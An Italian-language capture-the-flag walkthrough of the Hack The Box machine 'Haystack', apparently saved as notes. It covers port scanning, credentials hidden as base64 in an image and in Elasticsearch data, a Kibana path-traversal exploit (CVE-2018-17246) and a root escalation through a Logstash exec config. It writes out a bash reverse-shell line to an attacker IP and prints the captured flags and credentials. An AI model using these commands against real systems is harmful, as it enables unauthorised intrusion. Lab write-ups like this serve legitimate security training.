@@ -1,0 +1,204 @@
+1) per prima cosa parto con scan di masscan per trovare porte aperte:	
+	comando: masscan -p1-65535 10.10.10.115 --rate 1000 --open --banners --e tun0
+Discovered open port 22/tcp on 10.10.10.115                                    
+Discovered open port 9200/tcp on 10.10.10.115 
+
+adesso faccio scansione con nmap
+	comando:nmap -p22,80,9200 -Pn -sC -sV -oA nmap/haystack 10.10.10.115
+
+PORT     STATE SERVICE VERSION
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+| http-methods: 
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+
+possiamo vedere sulla porta 9200 il server nginx ha abilitato il metodo DELETE, inoltre la versione di ssh
+sulla porta 22 è vuln a un attacco di user enumeration.
+sul server a 9200 troviamo elasticsearch (parte dell' ELK stack):
+{
+  "name" : "iQEYHgS",
+  "cluster_name" : "elasticsearch",
+  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
+  "version" : {
+    "number" : "6.4.2",
+    "build_flavor" : "default",
+    "build_type" : "rpm",
+    "build_hash" : "04711c2",
+    "build_date" : "2018-09-26T13:34:09.098244Z",
+    "build_snapshot" : false,
+    "lucene_version" : "7.4.0",
+    "minimum_wire_compatibility_version" : "5.6.0",
+    "minimum_index_compatibility_version" : "5.0.0"
+  },
+  "tagline" : "You Know, for Search"
+}
+
+
+2) andando sulla porta 80 da browser si ottiene una semplice pagina con una semplice immagine.
+Controllando il codice della pagina non c'è nulla di strano, quindi potrebbe essere utile (essendo molto ctf-like)
+controllare l'immagine. Faccio il download e poi la controllo con l'utility strings (mostra le stringhe stampabili in qualsiasi file):
+
+comando: strings index.jpg | tail
+
+risultato:
+:t6Q6
+STW5
+*Oo!;.o|?>
+.n2FrZ
+rrNMz
+#=pMr
+BN2I
+,'*'
+I$f2/<-iy
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+
+come si può vedere l'ultima stringa è codificata in base64, decodificata otteniamo:
+	la aguja en el pajar es "clave"
+che tradotta (da spagnolo) significa:
+	l'ago nel pagliaio è "chiave"
+
+3)in generale a questo punto avrei fatto dirb su porta 80 e 9200 
+per la 80 dirb non trova nulla a aparte l'index già visto
+per la 9200 è possibile usare elasticsearch stesso
+tramite la rest api (https://www.elastic.co/guide/en/elasticsearch/reference/current/rest-apis.html   è per 7.4 ma cambiano poche cose per 6.4)
+in primo luogo vediamo tutti gli indici presenti:
+	http://10.10.10.115:9200/_cat/indices?v		//v indica verbose mode
+
+otteniamo:
+
+health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
+green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
+yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
+yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
+	
+
+per prima cosa esploriamo quotes: 
+	http://10.10.10.115:9200/quotes/_search?size=1000	//devo specificare anche la quantità di record che voglio altrimenti non funziona
+ottengo molti risultati, a questo punto controllo se nel pagliaio dei risultati trovo l'ago ovvero la parola "clave",
+posso farlo o tramite f3 nel browser (nei raw data) o tramite curl e grep nel terminale, ottengo:
+
+	quote:"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="
+	quote:"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+
+ovvero altre due frasi in spagnolo con due valori in base64, traducendo ecc ottengo:
+	quote:"Questa chiave non può essere persa, la tengo qui: pass: spanish.is.key"
+	quote:"Devo salvare la password per la macchina: user: security"
+
+quindi ho ottenuto un user e una password da poter utilizzare -> security:spanish.is.key
+
+4) provo a collegarmi tramite ssh e in effetti riesco ad ottenere la shell con user security@haystack e subito ottengo il flag per user:
+	04d18bc79dac1d4d48ee0a940c8eb929
+ovviamente non ho i permessi per accedere alla cartella root
+
+5)per cercare qualcosa per priv escalation carico LinEnum sull'host remoto tramite scp:
+	scp LinEnum.sh security@10.10.10.115:/home/security
+e poi lo eseguo ù, ottengo molte info (tra cui il fatto che kibana 8altra parte di ELK stack è in esecuzione), in particolare 
+per quanto riguarda le porte:
+[-] Listening TCP:
+State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
+LISTEN     0      128          *:80                       *:*                  
+LISTEN     0      128          *:9200                     *:*                  
+LISTEN     0      128          *:22                       *:*                  
+LISTEN     0      128    127.0.0.1:5601                     *:*                  
+LISTEN     0      128       ::ffff:127.0.0.1:9000                    :::*                  
+LISTEN     0      128         :::80                      :::*                  
+LISTEN     0      128       ::ffff:127.0.0.1:9300                    :::*                  
+LISTEN     0      128         :::22                      :::*                  
+LISTEN     0      50        ::ffff:127.0.0.1:9600                    :::* 
+
+in particolare 127.0.0.1:5601 è la porta di default di kibana (lo capisco sia facendo una semplice curl 127.0.0.1:5601) oppure cercando la porta su internet.
+dalla documentazione è possibile eseguire il seguente comando:
+	curl 127.0.0.1:5601/api/status
+grazie al quale si ottengono molte informazioni -> version:6.4.2
+il pannello però è accessibile solo tramite  web browser quindi è necessario esporre il servizio per poter usare 
+il browser che è solo sulla mia macchina, è possibile farlo tramite ssh 
+facendo un port forwarding (https://www.francescochiriaco.it/ssh-port-forwarding/):
+
+	ssh security@10.10.10.115 -L 5602:localhost:5601	//dalla mia macchina
+
+ora posso accedere al pannello tramite firefox usando la porta locale che ho dato a questa connessione e il localhost:
+	127.0.0.1:5602	
+
+conoscendo la versione vedo che è vuln a https://www.cvedetails.com/cve/CVE-2018-17246/ 	->	https://github.com/mpgn/CVE-2018-17246
+
+per applicare la procedura descritta su github per prima cosa uso il codice js e lo salvo sul server:
+	1-mi metto in ascolto sulla mia macchina con 
+		netcat -lvnp 7891		//ascolta qualsiasi connessione su porta 7891
+	2-creo un file (con vim) in /home/security che si chiama rev.js e ci incollo la funz js copiata da git, la modifico doive serve
+	3-salva e esci
+	4-faccio curl "http://localhost:5602/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../home/security/rev.js"   
+		//se non funziona prova a spostare e cambiare nome a rev.js 
+a questo punto ho una shell  con utente kibana
+
+6)usando find / -group kibana -ls 2>/dev/null
+vediamo che gli utenti del gruppo kibana ( a cui ovviamente apprtiene l'utente kibana) hanno accesso ai file di configurazione di logstash:
+
+33864670    0 drwxrwxr-x   2 root     kibana         62 jun 24 08:12 /etc/logstash/conf.d
+33914760    4 -rw-r-----   1 root     kibana        109 jun 24 08:12 /etc/logstash/conf.d/output.conf
+33914752    4 -rw-r-----   1 root     kibana        186 jun 24 08:12 /etc/logstash/conf.d/input.conf
+33914769    4 -rw-r-----   1 root     kibana        131 jun 20 10:59 /etc/logstash/conf.d/filter.conf
+
+
+filter.conf contiene:
+
+filter {
+	if [type] == "execute" {
+		grok {
+			match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
+		}
+	}
+}
+
+dunque un filtro creato con grok che permette di eseguire solo determinati comandi
+input.conf:
+
+input {
+	file {
+		path => "/opt/kibana/logstash_*"
+		start_position => "beginning"
+		sincedb_path => "/dev/null"
+		stat_interval => "10 second"
+		type => "execute"
+		mode => "read"
+	}
+}
+
+output.conf
+
+output {
+	if [type] == "execute" {
+		stdout { codec => json }
+		exec {
+			command => "%{comando} &"
+		}
+	}
+}
+
+In base a questi file quindi si deve creare un file in /opt/kibana con nome = logstash_* (sostituire qualunque cosa al posto di *)
+In questo file mettiamo una serie di comandi da eseguire che rispettino la forma del filter.conf (\s* è lo spazio)
+e infine aspettare che venga eseguito, comando:
+	Ejecutar comando : bash -i >& /dev/tcp/10.10.15.79/9001 0>&1
+
+nel frattempo mi metto in ascolto sulla porta 9001 con netcat -lvnp 9001
+
+7)dopo poco in effetti si apre una shell di root sulla porta 9001, così otteniamo anche root flag: 3f5f727c38d9f70e1d2ad2ba11059d92
+
+
+	               
+
+
+
+
+
+
+
